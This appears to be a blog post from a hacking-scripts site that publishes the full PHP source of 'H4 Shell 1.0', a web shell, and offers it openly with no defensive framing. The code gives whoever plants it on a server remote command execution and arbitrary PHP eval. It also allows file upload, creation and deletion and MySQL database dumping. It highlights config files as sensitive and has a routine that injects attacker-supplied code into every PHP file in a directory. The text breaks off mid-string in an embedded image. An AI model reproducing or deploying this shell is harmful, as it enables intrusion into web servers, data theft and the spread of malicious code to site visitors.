---
id: 175
title: H4 Shell (encrypted)
author: admin
layout: post
guid: http://hackingscripts.com/?p=175
permalink: /h4-shell-encrypted/
categories:
  - H4
  - PHP
tags:
  - H4
  - PHP
---
H4 Shell version 1.0. c0ded by H4KOOOM.

Includes the following words of wisdom: &#8216;Cuz We Back Rude This Time&#8217; and &#8216;Do not think you are the most genius in the world&#8217;. Take heed!


### H4 Shell Source Code

{% highlight php linenos %}<?php
# H4 Shell 1.0
# c0ded by H4KOOOM
# http://sa-hacker.com
# 23/05/11
# Cuz We Back Rude This Time
# Do not think you are the most genius in the world 
////////////////////////////////////////////////////////////////////////////////////////

error_reporting(0); 
// ÇáÏæÇá 
   $version = '1.0'; 
   $info = $_SERVER['SERVER_SOFTWARE'];
   $page = $_SERVER['SCRIPT_NAME'];
   $site = getenv("HTTP_HOST");
   $uname = php_uname();
   $smod = ini_get('safe_mode');
           if ($smod == 0) { $safemode = "&lt;font color='lime'&gt;OFF&lt;/font&gt;"; }
           else { $safemode = "&lt;font color='red'&gt;ON&lt;/font&gt;";      }
   $dir = realpath($_POST['dir']);
   $mkdir = $_POST['makedir'];
   $mydir = $_POST['deletedir'];
   $cmd = $_GET['cmd'];
   $us3r = exec('id');
   $p0d = exec('pwd');
   $v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "&lt;font color=red&gt;".$v."&lt;/font&gt;";}
else {$openbasedir = false; $hopenbasedir = "&lt;font color=lime&gt;OFF&lt;/font&gt;";}
   $host = $_POST['host'];
   $proto = $_POST['protocol'];
   $delete = $_POST['delete'];
   $phpeval = $_POST['php_eval'];
   $db = $_POST['db'];
   $query = $_POST['query'];
   $user = $_POST['user'];
   $pass = $_POST['passd'];
   $myports = array("21","22","23","25","59","80","113","135","445","1025","5000","5900","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018");
   $quotes = get_magic_quotes_gpc();
if ($quotes == "1" or $quotes == "on")
   {
       $quot = "&lt;font color='red'&gt;ON&lt;/font&gt;";
   }
   else
   {
       $quot = "&lt;font color='lime'&gt;OFF&lt;/font&gt;";
   }
   
   // ÇáÊÕÇÑíÍ 
    function getperms($fn)
{
$mode=fileperms($fn);
$perms='';
$perms .= ($mode & 00400) ? 'r' : '-';
$perms .= ($mode & 00200) ? 'w' : '-';
$perms .= ($mode & 00100) ? 'x' : '-';
$perms .= ($mode & 00040) ? 'r' : '-';
$perms .= ($mode & 00020) ? 'w' : '-';
$perms .= ($mode & 00010) ? 'x' : '-';
$perms .= ($mode & 00004) ? 'r' : '-';
$perms .= ($mode & 00002) ? 'w' : '-';
$perms .= ($mode & 00001) ? 'x' : '-';
return $perms;
}

   // ÇáÃÍÌÇã + b
   $spacedir = @getcwd();
   $free = @diskfreespace($spacedir);
   
if (!$free) {$free = 0;}
   $all = @disk_total_space($spacedir);
if (!$all) {$all = 0;}
function view_size($size)
{
if($size &gt;= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
elseif($size &gt;= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
elseif($size &gt;= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
else {$size = $size . " B";}
return $size;
}
$percentfree = intval(($free*100)/$all);


// ãÚáæãÇÊ ÇáÓíÑÝÑ 
if(isset($_POST['phpinfo']))
{
die(phpinfo());
}
   
// ÅäÔÇÁ ãáÝ

   $name = htmlspecialchars($_POST['names']);
   $src = $_POST['source'];
    if(isset($name) && isset($src))
      {
      if($_POST['darezz'] != realpath("."))  { $name = $_POST['darezz'].$name; }
   $ctd = fopen($name,"w+");
   fwrite($ctd, stripslashes($src));
   fclose($ctd);
   echo "&lt;script&gt;alert('Êã ÅäÔÇÁ ÇáãÌáÏ')&lt;/script&gt;";
   $dir = $dir.$_POST['darezz'];
   chdir(realpath('.'));
      }

// ÑÝÚ ãáÝ ÊÍÊÇÌ ÊØæíÑ
   $path = $_FILES['ffile']['tmp_name'];
   $name = $_FILES['ffile']['name'];
   if(isset($path) && isset($name))
{ 
if($_POST['dare'] != realpath("."))  { $name = $_POST['dare'].$name; }
   if(move_uploaded_file($path, $name))
   {
      echo "&lt;script&gt;alert('Êã ÑÝÚ ÇáãáÝ ÈäÌÇÍ')&lt;/script&gt;";
   }
   else
   {
      echo "&lt;script&gt;alert('ÎØÇÁ áã íÊã ÇáÑÝÚ')&lt;/script&gt;";
}   }

// ÍÐÝ ãáÝ
   
   if(isset($delete) && $delete != $dir)
{
      if(file_exists($delete))
      {
         unlink($delete);
         echo "&lt;script&gt;alert('Êã ÍÐÝ ÇáãáÝ ÈäÌÇÍ')&lt;/script&gt;";
      }
	  
}

// ÞæÇÚÏ ÇáÈíÇäÇÊ
   
   if(isset($db) && isset($query) && isset($_POST['godb']))
{
   $mysql = mysql_connect("localhost", $user, $pass)or die("&lt;script&gt;alert('ÎØÇ Ýí ÇáÃÊÕÇá')&lt;/script&gt;");
   $db = mysql_select_db($db)or die(mysql_error());
   $queryz = mysql_query($query)or die(mysql_error());
if($query) { echo "&lt;script&gt;alert('Êã ÈäÌÇÍ')&lt;/script&gt;"; }
else { echo "&lt;script&gt;alert('ÎØÇÁ ')&lt;/script&gt;"; }
}

// ÇáÃÊÕÇá ÈÞæÇÚÏ ãæÞÚ [pacucci.com]
if(isset($_POST['dump']) && isset($user) && isset($pass) && isset($db)){
mysql_connect('localhost', $user, $pass);
mysql_select_db($db);
$tables = mysql_list_tables($db);
while ($td = mysql_fetch_array($tables))
{
$table = $td[0];
$r = mysql_query("SHOW CREATE TABLE `$table`");
if ($r)
{
$insert_sql = "";
$d = mysql_fetch_array($r);
$d[1] .= ";";
$SQL[] = str_replace("n", "", $d[1]);
$table_query = mysql_query("SELECT * FROM `$table`");
$num_fields = mysql_num_fields($table_query);
while ($fetch_row = mysql_fetch_array($table_query))
{
$insert_sql .= "INSERT INTO $table VALUES(";
for ($n=1;$n&lt;=$num_fields;$n++)
{
$m = $n - 1;
$insert_sql .= "'".mysql_real_escape_string($fetch_row[$m])."', ";
}
$insert_sql = substr($insert_sql,0,-2);
$insert_sql .= ");n";
}
if ($insert_sql!= "")
{
$SQL[] = $insert_sql;
}
}
}
$dump = "-- Database: ".$_POST['db'] ."\n";
$dump .= "-- Powered by H4 Shell\n";
$dump .= "-- Http://SA-HACKER.COM\n";
$dumpp = $dump.implode("r", $SQL);
$name = $db."-".date("d-m-y")."_by_H4_shell.sql";
Header("Content-type: application/octet-stream");
Header("Content-Disposition: attachment; filename = $name");
echo $dumpp;
die();
}

// ÅäÔÇÁ ãÌáÏ
if(isset($mkdir)) {

mkdir($mkdir);
if($mkdir) { echo "&lt;script&gt;alert('Êã ÅäÔÇÁ ÇáãÌáÏ ÈäÌÇÍ')&lt;/script&gt;"; } }

// ÍÐÝ ãÌáÏ

if(isset($mydir) && $mydir != "$dir") {
$d = dir($mydir);
while($entry = $d-&gt;read()) {
if ($entry !== "." && $entry !== "..") {
unlink($entry);
}
}
$d-&gt;close();
rmdir($mydir);

}
// Eval
if(isset($phpeval)) {
$eval = @str_replace("<?","",$phpeval);
$eval = @str_replace("?>","",$phpeval);
@eval(stripslashes($eval));
die();
}
// ÍÞä ßæÏ ÞÇÈáÉ ááÊØæíÑ 

if(isset($_POST['inf3ct']))
{
foreach (glob("*.php") as $lola)
{
$dira = '.';
$asdi = fopen($lola, 'a+');
@fwrite($asdi, $_POST['cod3inf']);
@fclose($asdi);
}
if($asdi)
{
$textzz = '&lt;font size=1 face=Tahoma color=green&gt;Êã ÍÞä ÌãíÚ ÇáãáÝÇÊ ÈäÌÇÍ&lt;/font&gt;';
}
else {
$textzz = '&lt;font size=1 face=Tahoma color=red&gt;ÎØÇ áã íÊã ÇáÍÞä &lt;/font&gt;';
}
}



// ÕæÑ ÇáãáÝÇÊ æÇáãÌáÏÇÊ ãÔÝÑå æãÒÑæÚÉ 
   if($_GET['com'] == "image")
   {
   $images = array(
   "folder"=&gt; "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGtSURBVHjaYmRgYGBazMf3lwENxH76pA2kbgPxPyDGkIcBgABiAGr+/+/zZwwMEgfKOwExFxCzQDEzEDMi6wcIIJAgw59z5zAMjn76lIFBWnovIZcBBBDYgP/v34Ml///7x8DIxASmf+3eDTEEHUhLXwUa4ghkHQUZABBAYAP+vXnD8Pf2bYb106czEAOA3tsPMwQggCAGvH4N1ozVRlxAWhpkiAVAAEG8AHQBCPw+cgQi+RcY6H/+MPz/9Qso+Jvh/48fDP9//gTa9I/h55IlDOyhoTBjXAECCO4FsEEfPgAjlQlDM8hAOP/rV4b/Hz/CDBAGCCCIAW/fgnn/QIEJtAWMYa4A2QzUDKZBfKCB/6CBDopSgACCeOHdO4gLQCaDNP//D9EE1MAA1Ai2Hc0VMAAQQKjRCPQKKArBAKQZpBiqGWw71AXIBgAEEMSAz58ZkL0CdgFUA9ggkAFQg/8DDWX4/h2m/wdAAIGSpRYwXq8ykAiAUbgKSK0HCCCQAaxAbAjEzkAsRKR+kBMuAPFegACCZQwQzQ41jBgAyp2/QCEFEECM/0H+pQAABBgAaE8F4JYoHyAAAAAASUVORK5CYII=",
   "file"=&gt; "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAASUExURZwAAM6urXtJSgAAAP///////0X/XP4AAAAGdFJOU///////ALO/pL8AAABDSURBVHjapI1LFgAgCAJJ4/5X7qOV1rJhNw8UJDWEIKXuiJrYlCUAJIFBHwRxTUykhh/JR0PjeSvOR6McpqAG2AQYAL10AzDbmKTEAAAAAElFTkSuQmCC",
   "floppy"=&gt; "R0lGODlhECAQILMgIB8jVq2yyI0csGVuGcjL2v///9TY405WfqOmvjI+bHoaoQsMQxR+uubn7bu+0f///yH5BAEgIA8gLCAgICAQIBAgIAR/8CHEHlVq6HMZNEUYJGFZMiACFtxpCiBDHgLjEwogzLfZDAuBw0AsEn0eIAKocAR+E0Yls1koAn2skjLFDA7WQKlBJh6z4AEiVDZneDDFrNEwE95QRHwgaFOdSlx6CwcKdndOUQxxJgZgFgIYCjALCQN/eRUWIAsPIHggoSCdESA7"
   );
header("Content-type: image/gif");
header("Cache-control: public");
header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
header("Cache-control: max-age=".(60*60*24*7));
header("Last-Modified: ".date("r",filemtime(__FILE__)));
$image = $images[$_GET['img']];
echo  base64_decode($image);
}
// ÃäæÇÚ ÇáãáÝÇÊ ( ãáÝ - ãÌáÏ )

   chdir($dir);
   if(!isset($dir)) { $dir = @realpath("."); }
    if($dir != "/") { $dir = @realpath("."); } else { $dir = "."; }
   if (substr($dir,-1) != DIRECTORY_SEPARATOR) {$dir .= DIRECTORY_SEPARATOR;}
   $pahtw = 0;
   $filew = 0;
   $num = 1;
 
   if (is_dir($dir))
   {
      if ($open = opendir($dir))
      {
      if(is_dir($dir)) {
   $typezz = "DIR";
   $pahtw++;
}
         while (($list = readdir($open)) == true)
         {
         
         if(is_dir($list)) {
   $typezz = "ãÌáÏ";
   $pahtw++;
   $listf.= '&lt;tr&gt;&lt;td valign=top&gt;&lt;img src=?com=image&img=folder&gt;&lt;font size=2 face=Verdana&gt;['.$list.']&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;'.$typezz.'&lt;/font&gt;&lt;/td&gt;&lt;td valign=top&gt;&lt;/td&gt;&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;' . getperms($list) .'&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;'; }
else {
 
   $lolz = filesize($list) / 1024;
   $lolx = intval($lolz);
   if($lolx == 0) { $lolx = 1; }
   $typezz = "ãáÝ";
   $filew++;
   $listz = "/".$list;
   if(eregi($page,$listz)) {    
   $listf.= '&lt;tr&gt;&lt;td valign=top&gt;&lt;img src=?com=image&img=file&gt;&lt;font size=2 face=Verdana color=yellow&gt;
'.$list.'&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;'.
$typezz.'&lt;/td&gt;&lt;td valign=top width=15%&gt;&lt;font size=2 face=Verdana&gt;' . 
$lolx .' ß È&lt;/td&gt;&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;' . getperms($list) . '&lt;/font&gt;&lt;/tr&gt;'; }
   elseif(eregi('conf',$listz) && eregi('.php',$listz)) { $listf.= '&lt;tr&gt;&lt;td valign=top&gt;&lt;img src=?com=image&img=file&gt;&lt;font size=2 face=Verdana&gt;&lt;b&gt;&lt;b&gt;&lt;font face=Verdana color=#FF0000&gt;'.$list.' &lt;/font&gt;&lt;font face=Verdana&gt;&lt;span &gt;=---------&gt;&lt;/span&gt;&lt;/font&gt;&lt;font face=Tahoma color=#FF0000&gt; Êã ÇáÚËæÑ Úáì ãáÝ ÍÓÇÓ &lt;/font&gt;
&lt;/b&gt;&lt;/b&gt;&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;'.$typezz.'&lt;/td&gt;&lt;td valign=top width=15%&gt;&lt;font size=2 face=Verdana&gt;' . $lolx .' ß È&lt;/td&gt;&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;' . getperms($list) . '&lt;/font&gt;&lt;/tr&gt;'; }
   else {$listf.= '&lt;tr&gt;&lt;td valign=top&gt;&lt;img src=?com=image&img=file&gt;&lt;font size=2 face=Verdana&gt;'.$list.'&lt;td valign=top&gt;&lt;font size=2 face=Verdana &gt;'.$typezz.'&lt;/td&gt;&lt;td valign=top width=15%&gt;&lt;font size=2 face=Verdana&gt;' . $lolx .' ß È&lt;/td&gt;&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;' . getperms($list) . '&lt;/font&gt;&lt;/tr&gt;'; }  }
   
   }         
   closedir($open);
         
      }
$fileq = $pahtw + $filew;   }



// ÈÏÇíÉ áÛÉ html
echo "&lt;html&gt;
&lt;meta http-equiv=Content-Language content=ar-sa&gt;
&lt;meta name=GENERATOR content=Microsoft FrontPage 6.0&gt;
&lt;meta name=ProgId content=FrontPage.Editor.Document&gt;
&lt;meta http-equiv=Content-Type content=text/html; charset=windows-1256&gt;

&lt;head&gt;&lt;title&gt;$site ~ Shell H4 &lt;/title&gt;
&lt;style&gt;
table.menu {
border-width: 0px;
border-spacing: 2px;
border-style: solid;
border-color: #a6a6a6;
border-collapse: separate;
background-color: #480000;
}
table.menuz {
border-width: 0px;
border-spacing: 1px;
border-style: solid;
border-color: #a6a6a6;
border-collapse: separate;
background-color: #480000;
}
table.menu td {
border-width: 1px;
padding: 7px;
border-style: none;
border-color: #333333;
background-color: #000000;
-moz-border-radius: 15px;
}
table.menuz tr {
border-width: 1px;
padding: 1px;
border-style: none;
border-color: #333333;
background-color: #000000;
-moz-border-radius: 0px;
}

table.menuz tr:hover {
background-color: #480000;
}
input,textarea,select {
font: normal 12px Tahoma, Arial, Helvetica, sans-serif;
background-color:black;
color:#a6a6a6;
border: solid 1px #900000;
}
&lt;/style&gt;
&lt;/head&gt;
&lt;body bgcolor='#480000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'&gt;


&lt;div align=lift&gt;
	&lt;table class=menu width=250  &gt;
&lt;tr&gt;&lt;td&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='6' face='tahoma'&gt;!&lt;/font&gt;
&lt;a href='".$_SERVER['HTTP_REFERER']."'&gt; 
&lt;font face='Verdana' size='5'&gt;~ H4 Shell ~&lt;/font&gt;&lt;/a&gt;
&lt;font size='6' face='tahoma'&gt;!&lt;/font&gt;&lt;/b&gt;
&lt;/center&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;



&lt;table class=menu dir=rtl width=100%&lt;tr&gt;&lt;td&gt;
&lt;font size='1' face='Tahoma'&gt;
&lt;b&gt;&lt;font color=#FFFFFF&gt;ÇáæÖÚ ÇáÃãä :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;$safemode&lt;/u&gt; &lt;br&gt; 
&lt;b&gt;&lt;font color=#FFFFFF&gt;ÇáãÇÌíß  :&lt;/font&gt;&lt;/b&gt;&lt;font &gt; &lt;u&gt;$quot&lt;/u&gt; &lt;br&gt;
&lt;b&gt;&lt;font color=#FFFFFF&gt;ÅãßÇäíÉ ÇáÊäÞá :&lt;/font&gt;&lt;/b&gt;&lt;font &gt; &lt;u&gt;$hopenbasedir&lt;/u&gt; &lt;br&gt;
&lt;b&gt;&lt;font color=#FFFFFF&gt;ÇáÈÑãÌíÇÊ :&lt;/font&gt;&lt;/b&gt;&lt;font &gt; &lt;u&gt;$info&lt;/u&gt; &lt;br&gt;
&lt;b&gt;&lt;font color=#FFFFFF&gt;ÃÕÏÇÑ ÇááæßÇá :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;$uname&lt;/u&gt; &lt;br&gt;
&lt;b&gt;&lt;font color=#FFFFFF&gt;ÃÕÏÇÑ Èí ÇÊÔ Èí :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; ".@phpversion()."&lt;/u&gt; &lt;br&gt;
&lt;b&gt;&lt;font color=#FFFFFF&gt;ÇáãæÞÚ :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;$site&lt;/u&gt; &lt;br&gt;
&lt;b&gt;&lt;font color=#FFFFFF&gt;ÇáÓíÑÝÑ :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;" . $_SERVER['SERVER_NAME'] . "&lt;/u&gt; &lt;br&gt;
&lt;b&gt;&lt;font color=#FFFFFF&gt;ãÓÇÑ ÇáÔá :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;" . $_SERVER['SCRIPT_FILENAME'] . "&lt;/u&gt; &lt;br&gt;
&lt;b&gt;&lt;font color=#FFFFFF&gt;ãÓÇÑß ÇáÍÇáí :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;$dir&lt;/u&gt; &lt;br&gt;
&lt;b&gt;&lt;font color=#FFFFFF&gt;ÕáÇÍíÇÊß :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;$us3r&lt;/u&gt; &lt;br&gt;
&lt;/font&gt;&lt;font color=#FFFFFF&gt; &lt;b&gt;ÇáãÓÇÍå ÇáßáíÉ  :&lt;/b&gt;&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;u&gt;".view_size($all)."&lt;/u&gt; 
&lt;/font&gt;&lt;font color=#FFFFFF&gt; -&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;/font&gt;
&lt;font color=#FFFFFF&gt;&lt;b&gt; ÇáãÓÇÍå ÇáÍÑå :&lt;/b&gt;&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;u&gt;".view_size($all)."&lt;/u&gt;  &lt;br&gt;
&lt;/font&gt;&lt;font color=#FFFFFF&gt; &lt;b&gt;ÚäæÇäß :&lt;/b&gt;&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;u&gt;" . $_SERVER['REMOTE_ADDR'] ."&lt;/u&gt; 
&lt;/font&gt;&lt;font color=#FFFFFF&gt; -&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;/font&gt;
&lt;font color=#FFFFFF&gt;&lt;b&gt; ÚäæÇä ÇáÓíÑÝÑ :&lt;/b&gt;&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;a href='http://whois.domaintools.com/". $_SERVER['SERVER_ADDR'] ."'&gt;
&lt;font color=#FF0000&gt;".$_SERVER['SERVER_ADDR']."&lt;/font&gt;&lt;/a&gt;&lt;/td&gt;&lt;td width=230 &gt;&lt;img alt='Embedded Image' 
  src='data:image/png;base64,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
